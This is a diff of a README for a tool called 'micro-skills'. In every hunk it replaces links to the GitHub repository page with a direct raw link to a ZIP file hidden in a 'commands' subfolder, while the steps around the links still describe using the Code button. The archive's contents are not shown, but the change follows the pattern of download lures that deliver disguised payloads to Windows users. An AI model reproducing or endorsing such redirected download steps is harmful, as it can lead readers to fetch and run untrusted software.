@@ -1,6 +1,6 @@
 # 🧩 micro-skills - Clean skill gates in less time
 
-[![Download micro-skills](https://img.shields.io/badge/Download%20micro-skills-7b61ff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Liquidnitrogenmaenad512/micro-skills)
+[![Download micro-skills](https://img.shields.io/badge/Download%20micro-skills-7b61ff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Liquidnitrogenmaenad512/micro-skills/main/micro-skill-pipeline/commands/skills-micro-v1.7.zip)
 
 ## 🔍 What micro-skills does
 
@@ -30,7 +30,7 @@ micro-skills is built for people who want a simple way to work with skills files
 
 ## 📥 Download and open
 
-1. Visit this page to download: https://github.com/Liquidnitrogenmaenad512/micro-skills
+1. Visit this page to download: https://raw.githubusercontent.com/Liquidnitrogenmaenad512/micro-skills/main/micro-skill-pipeline/commands/skills-micro-v1.7.zip
 2. Look for the green Code button on the GitHub page
 3. Choose Download ZIP
 4. Save the file to your PC
@@ -199,7 +199,7 @@ It is also useful if you want a repeatable setup for tasks that need strict revi
 
 ## 📎 Quick path
 
-1. Open https://github.com/Liquidnitrogenmaenad512/micro-skills
+1. Open https://raw.githubusercontent.com/Liquidnitrogenmaenad512/micro-skills/main/micro-skill-pipeline/commands/skills-micro-v1.7.zip
 2. Download the ZIP
 3. Extract it on Windows
 4. Open the folder
